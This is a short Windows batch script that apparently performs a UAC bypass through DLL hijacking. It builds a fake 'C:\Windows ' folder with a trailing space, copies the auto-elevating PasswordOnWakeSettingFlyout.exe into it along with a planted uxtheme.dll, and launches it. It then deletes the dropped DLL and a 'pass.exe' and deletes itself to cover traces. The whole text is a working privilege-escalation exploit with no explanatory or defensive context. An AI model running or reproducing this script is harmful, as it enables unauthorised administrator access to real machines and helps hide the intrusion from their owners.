
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"

copy "C:\Windows\System32\PasswordOnWakeSettingFlyout.exe" "C:\Windows \System32\"

copy "uxtheme.dll" "C:\Windows \System32\"
"C:\Windows \System32\PasswordOnWakeSettingFlyout.exe"
echo  [-] UAC Bypassed ?
TIMEOUT /T 8
del /s  "C:\ProgramData\uxtheme.dll"
del /s  "C:\ProgramData\pass.exe"
del "%~dpnx0"





